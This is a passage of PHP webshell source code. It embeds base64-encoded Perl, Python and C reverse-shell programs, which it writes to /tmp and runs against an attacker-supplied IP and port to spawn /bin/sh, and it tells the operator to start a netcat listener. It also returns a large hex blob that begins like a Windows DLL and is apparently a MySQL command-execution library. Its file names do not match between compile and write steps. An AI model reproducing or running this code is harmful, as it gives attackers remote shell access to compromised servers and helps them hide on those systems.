$perlpath = $perlpath ? chop($perlpath) : 'perl'; echo Exec_Run($perlpath.' /tmp/b4che10r_pl '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000>execute command faild</font>' : '<font style=font:11pt color=ff0000>execute command successfully</font>'; } if($_POST['use'] == 'python') { $back_connect_py="IyAtKi0gY29kaW5nOnV0Zi04IC0qLQ0KIyEvdXNyL2Jpbi9lbnYgcHl0aG9uDQoiIiINCmJhY2sgY29ubmVjdCBweSB2ZXJzaW9uLG9ubHkgbGludXggaGF2ZS". "BwdHkgbW9kdWxlDQoiIiINCmltcG9ydCBzeXMsb3Msc29ja2V0LHB0eQ0Kc2hlbGwgPSAiL2Jpbi9zaCINCmRlZiB1c2FnZShuYW1lKToNCiAgICBwcmludCAn". "cHl0aG9uIGNvbm5lY3QgYmFja2Rvb3InDQogICAgcHJpbnQgJ3VzYWdlOiAlcyA8aXBfYWRkcj4gPHBvcnQ+JyAlIG5hbWUNCg0KZGVmIG1haW4oKToNCiAgIC". "BpZiBsZW4oc3lzLmFyZ3YpICE9MzoNCiAgICAgICAgdXNhZ2Uoc3lzLmFyZ3ZbMF0pDQogICAgICAgIHN5cy5leGl0KCkNCiAgICBzPXNvY2tldC5zb2NrZXQo". "c29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgIHRyeToNCiAgICAgICAgcy5jb25uZWN0KChzeXMuYXJndlsxXSxpbnQoc3lzLmFyZ3ZbMl". "0pKSkNCiAgICAgICAgcHJpbnQgJ2Nvbm5lY3Qgb2snDQogICAgZXhjZXB0Og0KICAgICAgICBwcmludCAnY29ubmVjdCBmYWlsZCcNCiAgICAgICAgc3lzLmV4". "aXQoKQ0KICAgIG9zLmR1cDIocy5maWxlbm8oKSwwKQ0KICAgIG9zLmR1cDIocy5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIocy5maWxlbm8oKSwyKQ0KICAgIG". "dsb2JhbCBzaGVsbA0KICAgIG9zLnVuc2V0ZW52KCdISVNURklMRScpDQogICAgb3MudW5zZXRlbnYoJ0hJU1RGSUxFU0laRScpDQogICAgcHR5LnNwYXduKHNo". "ZWxsKQ0KICAgIHMuY2xvc2UoKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KICAgIG1haW4oKQ=="; echo File_Write('/tmp/b4che10r_py',base64_decode($back_connect_py),'wb') ? '<font style=font:11pt color=ff0000>create /tmp/b4che10r_py success</font><br>' : '<font style=font:11pt color=ff0000>create /tmp/b4che10r_py faild</font><br>'; $pypath = Exec_Run('which python'); $pypath = $pypath ? chop($pypath) : 'python'; echo Exec_Run($pypath.' /tmp/b4che10r_py '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000>execute command faild</font>' : '<font style=font:11pt color=ff0000>execute command successfully</font>'; } if($_POST['use'] == 'c') { $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC". "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb". "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd". "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ". "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC". "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D". "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp". "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="; echo File_Write('/tmp/b4che10r_bc.c',base64_decode($back_connect_c),'wb') ? '<font style=font:11pt color=ff0000>create /tmp/b4che10r_bc.c success</font><br>' : '<font style=font:11pt color=ff0000>create /tmp/b4che10r_bc.c faild</font><br>'; $res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c'); @unlink('/tmp/b4che10r_bc.c'); echo Exec_Run('/tmp/b4che10r_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000>execute command successfully</font>' : '<font style=font:11pt color=ff0000>execute command faild</font>'; } echo '<br>local machine need run (nc -vv -l -p '.$_POST['yourport'].')'; } echo '</div>'; return true; } function Mysql_shellcode() { return "0x4d5a4b45524e454c33322e444c4c00004c6f61644c696272617279410000000047657450726f63416464726573730000557061636b42794477696e6740000000504500004c010200000000000000000000000000e0000e210b0100360090000000100100000000003d9502000010000000a00000000000100010000000020000040000000000000004000000000000000010030000020000000000000200000000001000001000000000100000100000000000001000000009980200dd020000f19702001400000000c001009000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002e557061636b000000b00100001000000000000000000000000000000000000000000000600000e02e727372630000000050010000c00100e6da000000020000000000000000000000000000600000e088010010e89a02101b0000000e000000001000106b970210b7970210ba970210c8970210a3970210fc0f0010de960210e0960210809502101dba0110ed970210ffaf0110d2960210000400007c070000c40b0000b30200006604000090c0011000000000ffffffff01000000010000000100000001000000000000000000000000000000010000008800008018000080000000000000000000000000000002006500000038000080660000006000008000000000000000000000000000000100040800005000000090000100004400000000000000000000000000000000000000000000000001000408000078000000904401005c3c000000000000000000000300420049004e00459398edb4853493541907b2de1fcbd640cd0773df2017d5f39748433f6d90c556f2b1c13f1be3bcb417f756a33186e453b17faf31e8157911b03da9aaf41f2277afffec07571bfae8214b0ff18af2f7c0ad2d95a1ff0f487658e587923bc1ce9d2c2698c74b940c5842bf55c7da2026563c174c45c6c5e08e95b030390ef0886bd124043aed5b1631b138955065fa05fbfcc1c0b81636c51c7f18bccc846ac8305f5c5134fd92a3e9cb2bb5d99ee1e21a6f5d2929597c59b61e8925c1675138746f1f549d1b8a0c35b7dab30b46a401737162d316fb50723e8a98ca5d6d298259015fe6e1c0a402790e15a965807b488c73e6915ffd6e57d333c0d86ef3a562e0bf0bccbe4bc7ccb560bc2df75d593904f638eae6a964c33f4e123a1d3c213b184373bf34c66ed68b368316156e32f6fa63e02add3b03893f73af8abd1099c48c1d0c886314167008ef255d5c2c3539fb781d6d39aa432d654c702f15df0a339530889adfefde4b9df29d2e8fa7e4317fda1b0588a22265eb53c317bc6ea94fa1981968d5a60921ff60f9e9559123aeaa8d1e91e38fb1a2fb1d2075454e8ef226538ed8307db2c99cd396b5c6da829569c3875f317a4bff429b0528d204af4284fc05207901d48e52b386e5d44c69a2e8e3086f137f1d0694ecd619ecc97af83a97d5a0598701b386bd704864c72b3858824fc94082da933d5fadb23ef3dee6528cd4cb2eefe2f2b03d17857940d70222d541b2523f4e7d5b8ee46caba89830d664defb08f798e83818cde2701b8c5d37fc6c5c045ae468efca8b8d5b62b60811c21dae6b86deffa3824e7581435c0bc67555c2d498047554b52d0bfc909911e94ce5d6d3a72659b0ee25f2b40be7d239115256d8c2687afc7e075a2557f974d9130d76e09955235ed4afbc03891d8cc489c8a6f0aa00cfa41ceffd29df70edd17679477c4edd29023c807a55e8dfe614fefe44ad759cfca628d9da21b68e2d6a7ab33d62b175fb858c94158923278f256e96eff885e3eafa12b09ecabfa54d523a3c33270510fd821a0f56e24d3bfaa815a6bd4e2eba52e52a940037728e2cbcd8278fe714384a4bfc887797b071bb440b010a9d0db60cbacee05907b7b08e20dba7f45ffd21265bc47086f8275c1c5071afaeb7ce0336e0a5facf0a7923597c7f4ee7b54512b38608c8ce06acd05cfcdd68ec58f288889ef615623409bc88dd3b09b8be22fcc199755426b4b0704ec21ae1a3e7efe21cf6952456f3743d8d76e1d02e7f7815ea30feb20f279fa9cf827d7618c1c182be35a5ab2eb9f611057b493eff526a75513347a1dce859f1d8d5cc9e842f55f82211b2fa26ce53c5f133afd31531c50324a5429b74fab0746eed031acb0d02344e1b495bca244ae6eba4dcd3da28419a064c22e895880fd2485c3e6861b6e06a4e43959b9d0633774ea85692b12408f6867903f8b9bf790973680440d4822238690617af451d0eebf942d4c98637e9ba092b38dcdc608f330722cc255a4feb5d2a3cb268518ebf43231d9630ac95ae22ff0b8640335febcaf6a3066be83f03673636639e7cb025963d4071886ef072bf9f6f5ad0e0a407734b77320cb1fc6a6a07d14d36403ac1b849eba998b5f64d59ecfa4e30200d84d236a12b1b11acae3e4d74ca5368657f93b4d80cc5356c5537ffab7d3f792a03912a01d94c03f4f097824586708ecc7cbd1db4b7e24a0f2e45121629b9c2bc92716b790246c4a4159fd9e4958fc13a4a72c1d799078d601f3eba6457ae19a68877841d343175f3b692ec219c3a059931421596335af3121670ef9602fce94de822922d7f1c357f7719b2a63de4a0c9b648297326b5a32082462e6bd83457f5c415a418209b4deecbb66f26383d9244f08e0aee60659808dbd2a4744865f6b6a0950ed88138a0c6496245c84d60caabef5facc467f114dd3b695e39fb076887147be54b8ff924aad0e159f4da839d7b67ea764b3e5906ad36bc3c476584bb38b7f009cedab0e6d89bb9ec76e3228e559b69c763bcbe2804dfbc4c6eba24173214dd72f455eaf170e5afc8b7a1ffac801dcd05a53aaef649f67f1d11cf249cdcf2e33a7d93e872d323a836a78be609996b592f3bb5fd8f6b952fd09d66647dcc055aa681b8af88597d510daae5255d2318b9b5e116b83b06c8a644010d677c683684abd9b677ac444ec7163218e4708336b0d12bbb660fe9bc21e49d2efc76d74e26c71d6c945267fd7d664fe5385abc834f661fe715b0924e9c63f5f6c88cb0ee11b44393a9113f6c17d56bd982a00cd4811653669c3a1b9535260742017659cf380fbf76ae37b92863bc94923f3990658db72c9c64bc29d4c2c03ec0c1c74e3558f66092c1d78d710d52a2c96cc6cad8729d9385016b36c9d231986cb60e8cfeb37aacf1205b9cbad985834c8b4b9d435e17dbc94967b5eb3e32e2a0423744951b1a087d85a822663de7a3f9c2253f7366d02e161b9b3a18fdee2946d741d3f2a5b0d0f3217e54d9cc97c8a62abca1b114240cce3576a7131069751af5a280721df185caace01a618f57cd8dc52e03a85048adb2d6f31d9d136817602ee2c38f694e6cb9eb2e830abf46b8a2f4ecf4fbd190e357d774e1dbe9de09650ea97486d41bb406c36d07dfa66c8347720158494c21ef841d6219aa0d3c8dd1cd33c3734e49ee574928bb0b1b28f86f0eced7c8fc50e93868455d6419ed7bffe464315490de54ab89437cd6f9f2e71fd59e4c5863ec3f83e4760edc9bc51a9c55a4b253c7966eb110259221449c131b3b328630ea1da1d8553d05fe6830902950a48d623396edd5280a1bbb165d1eab1a77f157d1b7870c4411850752bab0b6fb688d268901c2d8e456e3ee0614d1dd30a138f33661268fd83eb720f5953c280949f7760372ddfbcfd9fa54ced88fe574da013246aeea3bd41b72c6dbf603adcc21e5b7de44345d2a972ec002761a886b55579b8ff13286f668504c3290d15dbef81b1e96ad946a6466b7128d0ac11fb7fad4fe60b6c70e687c5665827a1ded9326f329c3dacb0dbd25ac1adcdc3eccab7d97db8c55b96afd5504bde724ca1489ef6108b25da9555f78111a6a04c30ae62961ade9cb8c02be27ba9984c0104ab80376719a08047d821b0bf60e1a29a6d7d377760b053ae91bf8057156e5b593a7dc8058f05e2da4ca217cf5be8881e00fa9d1f7a618820a0f0b2ba6175dbca0b6f035bc24ebe83198b5a90ebde91e8954581da67159639f40f37210a1bd8bf14dc987fd37b1a5fe69bda234e6d7f70d9ca0531039f19fd054904eea5b7a52ec468e5345437d0737b1495dc7249ea4cfa6f48c2e3e6158d5f0f1efd1bafb4d7fe0b0dce7ad98e8d3f57bb708a8aea83a0eea3ddc00394dfcdfafd308b6b24fa20c7625d2fcd6a5fae7d273ec98eea794bfe979dc3123ffc32c197bdca6321b57785908e6d19ab6f536a8df7e1e05baded7a4ebc007766c508a13394f51803beea47fac0ed97c25ed9888ddc6dc6219e704c6a132cd04cff7447b2df742108d0272366b11b2c4767464b460251de4ce3ce6d193589d14aec9b97766a6883e4dbf1dca0edf32f8980ebf2f9c935dcc56fa6e0b29798ea458e6edc0af271e6814fa425548e41fc8f641b8ad487a20812e4eb25063746b3d4244b101031580a0119d649ca5f32a68b11e7d5741a5ad7682fa8fafbe5aff113269b9a47923f81d3a028615f8c6e7b38e78e443cb2a49d91c2a7757a99df35aaa71dfd21e0b5591af970e6d2f239ff7e2d76acd9967ad6fc30d460d552f1930461e9b86a92d358618fa3b539029603a3260fc65d57a5909e35777a633d9093911fc636bfe3745a7510cb4633092223f5315f6745a604ac0365abae8968b19677f840b1502e21b638ceffd5075b3d3688eab91379dfeed65beaa5f7ca5b971dbc53c6c000b259dea5d6fd84b2e12090331a45299d807d3c12545f84710d36168ca4f277c8fa3982806faef71d73860b58f8db7a3116af13418100c8e905651b538b5c1853fb194c574a918b8f0426152253ff3db5af8289080fe0d7bf2b9d907c54eb2604d8f4e3865d8c7e8659acd1928182206c0efad42664b6ef473f74d7a8d681273590a487f250c143bd18253c3df904b620f4203757b029d8b41bfbcb9ace3d5e7673386dab5e3e486a3f49bbf89f5a4c67e0c1067c0adf6bbdfa43cd6289c1e45e46fc4f236a708684f9461787a90f6fd9a1f55690bbb3ddfcb94d960c39f58110acd1a4538b6ae85b06e4024610575bc3069a2b90b07e01096854e1e8bd00260bd495f975c8543030031c6fbcd201bf384f27f72af8c9ce354ef66a27fbc04dc0bb34f7a67518575d78bcac95243f1743b0f843f7806d1b6278766e05e90694a328230b378516ece63e46180a0c2d3972674fa8de29c864198e66173bea93f54995bfaa4b1e8638ba111187e26161d23ddbaff9a1dde6c8601b6c1c5e0658a153685de38e7a92a39d34587d67d10da2d7a01e70ac5488b16d0002229154101f0d5f6afd6636f7e376a3d5842861f8c5642b81676a5a3dc14de9bfe1e3011cb9e4cdd6a1afa87e84f86ee792a090f48f9540a23eb0928cf8d9f52a44acba76c827494bb6ef8971f1690d441f0ba8322b5cb15ee105e95ab47f560ecef4d5046c75ded3523549b3a2a0c878906af9ef17bddb57d82a437932d9b6802cf178e34f9c4764054f01902258e7d2317b9a98e78bc273e406d6fd2d33c4270cfd4596fedec01c4f9e6216f73a71e930b208d247dceee69f0d1f55a179c70b69f71c0e8a8b4cfdd89cdb1908d6d96b33d98a26456f79f26c744f9f7508983324cc354c1f20f89480c8c506fa04f59cb8ae99f8bf4ae9ba8b06f6aa052b695aa5da8143eefda5b3a4d65b0333f944861d2d53503236151731f4b262d66597865ffebc3474f3566b56f4ba520e9fd933c304ef9ca43bd6336e9b82e0e76724c1820aa1bc231ae694cf759938c29c210cb676885a65b4ae212f4382788458ea9a136bfc9bfed6f159e0844c4db54a3bac68d95cc91623f7e1476f8f736c131097daf671157f18d67116a2d273fa9e53375955bb7bb6ecb3518e7f05dd9248a1e26607708ab2a67904c44325fbe219e04512da82e93d466fa33a7d00d70d1cd45d650f3bf001bd7a2d0ae1c545fb75fb6af69bbde85e358e272b26dd2ea189db0a41c1131ec3882d5b72e3a643e02527909758ba4bd542746b60d822b35884b828a12b683aa4abd4861f7a249bbc0dbc12559e88c2bce5bf5aa35c0b17c69794abbc5765e7eabca36ebfb7318998f974d42f3df2564e29abe38e7671d25702051346b86fa36f6b71dae27e7506e5a5a790658646ab672bb825857890107e837992ab33ad751963c155d5d85dbca61092accb9e38c4589db3487082068f2dfc818fe05f8ce8a18dfc6716e0466e87d79ad6bf1353b0a34be96416d0f44c44a9563fdbc2c093875a385ecfdc6e11a488964690333669e8dc714957e0e1b3ce29c2309bd17ccc74520cda658381385821f44137a3486a682fcefc2e111d8304264538a64e8acb6e791960342463f970c4d250e154f28b66a5a7011bf7942c04e053804c100e79a1cbc4278f689ab9a3bd4669928bcad4c165644b53695fc7910a2129a872e548de830ef3b7ee255e7b6480f06f9fd895e84e5b5e038ffc0389317e95a79dbe8c95c8b8bcaef5a524abd85da966e905d2db3946d56eee8f5006ce54eea02c035af841bdcf95509422fc24329e6a03bf6eafbefe5b6ffe19f45a63ceb73ef8bcb0ea9e3030d27c3d6a8ddd88b041dc47fb229431498262a8887785dd8657c055229dad916a71360aa931bd7e158b6c17e3a2d8cefd88f77e40ebbcfa4db96b89d6f51402d7e325a8e64fe1fab085568dc5f373bce2bd05b24eb60f87214fa162086d5521d39ee0eb565f86f338ff996e3fcf4a9dc36f3a32cdcc356eff69cc0f5bacea0f331494796d808168b83eeb8489c0f687052c709e7558005e7d34aa60424265cc8a656d065ca83b78ed51d0a2a6f1768c3048ade80275469ca6091a5720d56e36c1c5dc0f6fa344259d34c2324821ede5ce0ddf1b9d9132270a6c2ace863d258b5377f3dabd660a0c4d59278fa23f056d76b077812e7db036500bdd1bb333043ff1aa5267ed828ee5af9e4cdbdeea851f3234f93700e681f13b5eacb938e03851d4e80f319d5dc8e6439fa41475d6f133d131cebefe4db7f3a7c0b9d62511805373e2a5ccb637b81fd27fddf03eb72d74bf20b54e00a501acf1a61aba9d994055402d838b85930912630335e5b545c0058d9474e5ac355a5f630f8ae6e3860bf8a62798926179a3bc9c2e7264752ea7a0b45bb6053169504510e70a043d3efdc5af76a2e1df04c2a2b7cf96dff5e8f212510d9dfec01b425107c9c8fa7500637a27eff7bb7eb7935566bfaf5d37323def1740318875ba2e0cea9dd3ae9ab7d0bf74ad9fb7c87c91a62aafd80b8661f28d5148d92a4f8f80167b786751a40edca8b3de8c2bb05c7cd682865ac3493377cba23a4e1fea18299336e7533e38af3598acde9646c1d6164b3fa8059aaa522824f6ffb90c12b4827d0e0302153f2126201bb6b588875cab0d346a7dc8749654f503f01bd9a4e672a88104829417bfd2e344b435fd111ce7ff27b56c81b44c487df01e63f0ba70228ad76fa2b4e0d5a57d7f63827afc2328a3f6b679eb581c9247689baf8057fc892bf5b323f19091b085bfd1625d7458d8a8a8ba3248fe992fe9edb14dafe34355234271d9ceaf4e9e298c02743be6b5488a8e248baae788e793301078ebc3824424374a0624404d6ce2d268fcf0052a20125e71295eea2b0c395ecb2f4bc20efd7270e4b00f2a17de04a587c4e17bdbb07713f830be090c4200db5477f75e44c9714d4eee288e438fd3c6887e5b08ba6f2f015dc749871fed99ac7bb5d25de80ff396f0139c1a98ecf25971383068cd71083d9a3d11f73860372efeb266da459d9e3f49d7c6a47e034ba7d97142cc6183bdcd38b0881ae18061070e767f68835d8e51dd585dbb6597b8e66ea60a553d876bd355b83d2c1340385ecfacda26d65c744aa6d025dd393ec353778c0c24df4abce8f96006856ce322cc902aed08ad19ec4c01ea392ddd15ea0b6f25fab35cc314169c440e9552e5dcfbf02a7eb924c8f40e7299245d550ced955f57dda2b95770de0f80041384f26f075cf4eeb0b893f5a3844e9779b5ed0c83810f6ff31836f6c289a7bdfc95e9d452f931e6dad9252d97220485e59aea90fa8df84b17e993f1627ac66a7ce4920eb63fd7f27b0969e7e19fb83f8252623818cd78ca73414cbb5be0f242ed5fbe337fafb88cc3d203b5cbc73daef664635f7c9db24a6a7795ab7f2fec1d47cda394ca4367013911174e0a7949c6a8993483c76891b248803a5be67deed96cf301a14ab61246be742eb8e3a09d3c619ad9f3320ff53b99c2b6b2f41b009d629ce0df2494836158fbe4bf7e3460d88cb212c99a4decf3f9ccec071f494269d7bd570b5ea0fca07485e5326a4a6727e7e0c101375e4239535ee6b0d63a20c3c9bfc5d0dd9940348c3421673039371ae3074698e7167c70fc635ecb2daa207aaf4570043f2dadb1af007b930d979cc0da729baff0e077df062ad3f2bcbd4e9daebd96f90fe9946cd88eee0d72a9ed035af0bfceb843a2399468088a24d8b999403438fc99f0da8e4a91a939953ffaf7251ca3fd466ff2110afb33242e278c6b072f5ed3df4c1482d28722874f0b1f30226bf336699766333dc331abf7ec09466be15eceaa2bc8d6b21ba56d5e960b7b485466ac92f03b3ae98bdc441686e2d89975756dd922bde9f8760c6a9a21e046d9f38ad2477e5c11e306b7f335eb5bdc198c28a28139b4944f43cd22b6798e89ed772271a43f1c802db013d047977dfd98361a4ee89186dbfe61fbfa02432ac4645f0ded7e6ec07e82f102922c1917082529e3a364b43196e93c1ec6353a0f972165d63b2086e43d31c21e28136e72f338ffeea68bca8490d58227d435dcd2defed8ca49cf486ab29b7e776220e66c20636f1f551d54bae83b4996ec68d656f1a29b82d806f5498f29178f503919d517835f289d4b5f679d61c4f91522ed8ab502b544346ed3b3c2fc949a149a24a703aa524a38a233323a02fe5fd220884d708999f227cc27f800b6b00c4cae107def5b0cb9ca4336875662af9622231b38521463432c4b7ef837569efbad1fb7d6ca953e28d1d0e520b0c98fd74a424a6c06d41a60d7cd6e8ee721847acf03f996c371c321a83bf15d37c72aaa44b51bf5a7e8caf1c3787eee48aaf372f010931cff21682968b2033bf4809203203ec61566f96fcd2acd00172d91e9bfb5b8025652263281d985b316040ddef4aeac0f8e3542b41b76ff98b5d0303854aaa254c3a841867bb25c65fcbc2271814b525be74b3401b240fe5fa3ab12175af55366c7a839fa2c7ff59f85bf0b51943df5c12537ca78ae77c176c5e4002a87893a62c256f0c4f86778e4e059c0aa20e75bfc5c2835f4df0fcd7ac1171f49a8ce39ec5b6a2f69b995997dc62f7638c6e379846045e4a6ee0c1dfd162e2655b45769fa10e87bfd6b4a488477dd4f8e70cdbdbeeff66daa8715f286ac7a73506871cc21e4f7ef300b6c295c78c1b3e5d6031d7fb3be5b5635bdb92bf94c3f4e4335724182facaa37c5d65ff165913ff61cd8971d178a62444e45d6c92b19bc9a1b21febe3715a1f9f916aaab25910986da22c736954bfbf8b0c0281b1ef97b9851b12ff39d1ad97dbecde06fb708a588f4bc99dc5d52f1ab87407b40c1e06d23761e354a2dfde9324f64b7d3391c5d2857904a12965011bd2d1f5d6e5fadc4d4acd5605167f10172dfbdf466ef9f34fd1b5b290d426bb3c4c812de12616016c6dfed62615f522342a1157218cc54ecb2874a3fff11d97810c5d667413cf74008b6ba55cf547d7ad1e10930da17f15a7b9979dcdec0191f00fecc45a8321f0ec2c4c2abc963f8bdf34f3d05b8db7591880c0e36ea294ca4e483be57094addbf9edae51f8b0c97bf47861304e7b304f3591f1f2e6f2b287b3ce9e64fefad5e811725b9a41ea799735ac307790582e651e16020bcb3c4a4c34735b4c6527703674d5506d63e7a5a5511018dd34532ca896906e1b8c9dcfab3ae32e52727f9322ca39609cfbcf058e20920c673e7af34cc8f3450b3a52e16deb895cdb2e412d26b88b9c2837bcb7f82c9992cdbe9dea677a34e4d9c612cb2dcdbcc9a2eb11d77558410c483844a7a9cca54e1a2a2d74d131817dbbefa63405bbbe04c659868fe80cf240daf9c26eebdb898077e59114a226bcd0d8a24e2ededb73f18128661f5ed021b14ccd6c706ad72dd68614248496fda0e7428ac21269c6cdfd567800cf258f031de85d46a1dd9f962acc481085a1078e95f9a839d5c08e55c2652879d2c2506429689612ed4a6431b1e2302965b00f9ae4c6520f18711ee8e618d4dca0d4927b88381cc0d5fe9652f29a3e45faf1918a1663b0a117fc3ba17640c01d60b305d4aa89afc9a50517e78bd488b66c4bda8ed57e3ba56270478bebb4737580f1f77785cb60bfcdfe840e9053d3b5f06750adcfbfe713cb46a1df4b7a828a4f3c8117e208a7b3d8d934b408478101d29dba20493b57a443962e2969f3165a200fe6ded2692a029cb1f9c138e25c14903129b018eba648d93c2079a614dd03d948fdea6e877b748fff6a7d396bc58e096ca72a525cb67594841f95a99ea9351ccda548a7b7b2311ec672b27e535edac3c2bbeeec863b4ed848b53488189ab6bfea6bd376e5280f0f4f5a1d526fbcc91a97a3d21f044235d6bed56284c19c41f4cfa3f31598e7dcb31fa761e61a9bf57f19daa3ba5634e5a37cb7bddc6115d436f9b3a0e56fc0adbbc4b34e8c0e25643d7b9bdb32267f524b2965a37e5070db5fb5b612d249ec12960128f7980d700b2253a5fab0fea4aa9735144d640d7f25a34282a3517f2dfe39d595c4c68a525e1ed92ebbdc50798b5b62fa8a694e61af9db663f2f0f6bec86ec451fa0b08584c23feab9804dcaf95899fe80206103a841f88ffd663d3d475eb4633ff36702afad9eb4c8b666014d89c21eff0f1036b6fe2845d5e24870e45d61f89eb8ed87a70289500391151d89ed889cda7fff8575a19e9b824aa2b28a9ff22a7b603bc6c91bfdd38b01303c2fbcd51d62a5fd73db8305ff84d7436901d0c3b613b6bae8216d15e357181b6cccb325dcb1ec9e41f5282165e6333011ae090f9fe001a3a2d8f3e47c1fcbb651c0040ae1fd3a593934b8e838ad397ba115433dff9f55e62dae5d5f768cd6a5becb121aaa08cd3f1e83f4ac69eb191247573ecc66c6c9faa7dc5f97e3405dbf86a9211c9450c62218c5f14f3719b0a1ebb7e9128e8989070e8921eb4e0552339b34d02b2b80d12a966ab63562ec61688d46b3beacf361793d9f2df65024473dd785b8ad4a5b98fcd1385cd2cb78e01061d0e8e23b437022f42a2f8ea396b44c1abf35b644efacbb064345eaba265093eb75d6ff9371edce1d3eb1ecbb364c55db41e0287554af06ca4b0db4875a5d2c8f1aba69771790d792b06ac064a9d12854e2324a485ccf5a4fe6ad39c3a57ff30c8a83b341bbc69e9dbbb89530b2009a30b5bff3adf3505311dd291208d47edd288bcf6bbff26a2877254b4dceed90a3f7a4a5b2f7594f02e43e07b635a4ee8b182c4fef7282352a655bcb4e8d7fa68365712b23ad0bd600dc3d5f39af26290a4dd8564b68d1c985cef5434c461d8206bac6d7c0d1e55eab379c5a8b1c17eeeace75590c78bc63a59e3a72827c0584500ca48ccfc2a65e16b3527950ade1f945f1dc31044f0b56ffd1d372014a9b347d85d63d0efe03d1bd6ae0fc95d5703dddfa091098ea4b8228ec77fb6fa192c969343232c3ea5896d9a39503c528564d8babfebde7c85c9ba14aeae5c012c41a75450ee464298d6af1cdb03e44211d2c6796babec9d335446977aa552a51dfdf7d61cc8ba4ada1d5674321ba172aabcb7e82caa3e497923de2a466ca1e908b118b4dd07fa6fb40901f3d6e0d6af3dcbeb2b678e44899b8663f1e91cd00a32f21c407965aa89cc3d6a43b5d9a4472c756e6620a82f22fdeee5e4d416698f75dafb1f4e19b4114b65e4ef6de33348cc5292a67e598eb84edd47841ea6145ae1a9feda9d2a41983af77596a87083ab0c88e27bde0ba0cb96b5ec0641b2c7b82455e3b72013fe5112e3ca8657e5a785fe8bf5fc2d2073bd75910a12215949867c1fd5a9639f6aa9640bbbc7e59194bd165dea0402f949e8baad329f46fa16cef4390faf9b7111e2575fe16e1b76639ca0079afbdd03741aa148754ad5d7dde6b4321ee295003a0b23001a2cdf27f263a71876958295fe9b3721c1f04ea2eebbe98bddd7f0af338a88b9bd57dc88710d28f573e2a2d905d713af99d492c129b2d539277d7418b1d357a74adbe27585c25bd2c16c9f39f66ced1f5472f2da1b92c195b5aa84737c1c51a7a1bde1344bae614912654ef6643e3d820b121dd2631cb6d497aa826c4eb79dc98c6b8a9bac431659610a6c7d1511a6fda5b7769c847b59052f072b2af69d47efca50f39afad47158ba81fe287d725d07003bb58f0ecdf7467992f63b6e413b932d70aae0930e0f1ff762f3d004526d89a388c690a20b949f574d6c248d6ab42696437dcfbc9fefeeb40742dd3c10d2f5f22c05e8e7c0fabbfa12aaf186a79b47f3c7e0cbcc2d0152ff2aea736096537a3c9c1f936ba96bb64733907701efd65a619c788b589a7f15702bcf2f0af62857b9f8a7e343156ed3e483fd08f34957354daeed6827c67b34f6b3461dfdb2bd3c8d390fb31930c3822fb7f694a22f3239d012f706dabff10b03f0e66869be4a435eff24469dac80754839d8933e1e781b965826eb53c47fc53bc2a85386cce1dd07fed6dc16390562ba8362bdc541919893cc2ccbf5565ba3b37166a31221de542d5b11ef0381d32e8ed8a4c8789a219721f821b38e2106cda68c2c6d2088fa5b3d1b9c2f8c543ef40555d9f667186fefef64b54dbae5a906dad48cd02e0fdb4500aa492e7efc6d5698dce363563bbd606179dc7821b9a736c31f39def29f10e40dafdc52d29b591178223b5e84f1983dd54a62981d8eab5b674d80c70627135ad90c1bcbdc2a9bdc926653cd56078eda264b9c9226fc4c9b549fc4cf73cdd41a7c26616755e7f8a1450f5236d1ba0c378188ae71d5344eadf7d04dfc122af44d59e9c263a258739c34082d88c0760ed5067baabd00485a3339e19afa4ffca023ac57c936fa78b1c7c04dc0d94f2542dfabb0f3ac3a7536d7d1384edf06729ff08eba1b7a7f5dd3f78f154f51f6092db8dbb91f8d0ea81065f4d0c431276a68f416022be7efa82d735613025c3f593c7d57b15643be8ad7126102ace4ec9a82b32b3ca4ca9140aec4d9f0172c7e7dcb22fd06e0b9d3bb1ae41b5c8a7d35e043e75f30eef7c0abd7d10bbe23847dab51b9031fc61f1f8a05cf395970d66d2193de952644efd0da226dc1858df23950e1d871d93ce5d1008e5dba83545a24ca5fc3012e126fa3950b6ece8849d4ab945583614e3b2afebd234049766b6e735956e93fddc17911129ae13bed1594c03d0f5d92929c3cb685172bafee4c9d0ef45ea41e453ed07df0aee980fb563d6ddde1ffd0774120946db1246da6ce55c76d31f93c495e100ed6a5afd7d193112bf1c068430e038320be0499ec8c524580700909ab767df81d86debdce5c01748f010ef0e9862027eb951a5018c4da0382b6c3dc8f76fac6fdecd4a0cb9a2b34d48ba009947706d3c720fd882b7cc73405a308a6784d14389d8d781b819ff